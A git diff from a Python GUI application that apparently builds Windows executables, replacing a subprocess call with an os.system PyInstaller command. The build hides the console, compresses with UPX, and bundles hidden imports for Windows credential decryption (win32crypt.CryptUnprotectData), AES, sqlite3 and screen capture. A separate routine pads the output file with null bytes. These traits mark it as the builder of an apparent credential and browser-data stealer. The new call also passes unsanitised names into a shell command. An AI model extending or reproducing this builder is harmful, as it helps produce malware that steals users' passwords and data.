@@ -4,7 +4,6 @@ import random
 import re
 import shutil
 import string
-import subprocess
 import threading
 import time
 from tkinter import filedialog
@@ -418,6 +417,7 @@ class App(customtkinter.CTk):
             for _ in range(int(pump_size)):
                 f.write((b'\x00'))
 
+
     @catcher
     def compile_file(self, filename):
         if self.iconpath is None:
@@ -425,30 +425,7 @@ class App(customtkinter.CTk):
         else:
             exeicon = self.iconpath
 
-        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
-                        '--hidden-import', 'base64',
-                        '--hidden-import', 'ctypes',
-                        '--hidden-import', 'json',
-                        '--hidden-import', 're',
-                        '--hidden-import', 'time',
-                        '--hidden-import', 'subprocess',
-                        '--hidden-import', 'sys',
-                        '--hidden-import', 'sqlite3',
-                        '--hidden-import', 'requests_toolbelt',
-                        '--hidden-import', 'threading',
-                        '--hidden-import', 'shutil.copy2',
-                        '--hidden-import', 'argv',
-                        '--hidden-import', 'zipfile.ZIP_DEFLATED',
-                        '--hidden-import', 'zipfile.ZipFile',
-                        '--hidden-import', 'psutil',
-                        '--hidden-import', 'PIL',
-                        '--hidden-import', 'PIL.ImageGrab',
-                        '--hidden-import', 'Crypto',
-                        '--hidden-import', 'Crypto.Cipher.AES',
-                        '--hidden-import', 'win32crypt',
-                        '--hidden-import', 'win32crypt.CryptUnprotectData',
-                        '--icon', f'{exeicon}',
-                        f'.\\{filename}.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        os.system(f"python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threading --hidden-import shutil.copy2 --hidden-import argv --hidden-import zipfile.ZIP_DEFLATED --hidden-import zipfile.ZipFile --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --hidden-import win32crypt.CryptUnprotectData --icon {exeicon} .\\{filename}.py")
 
 
     def cleanup_files(self, filename):
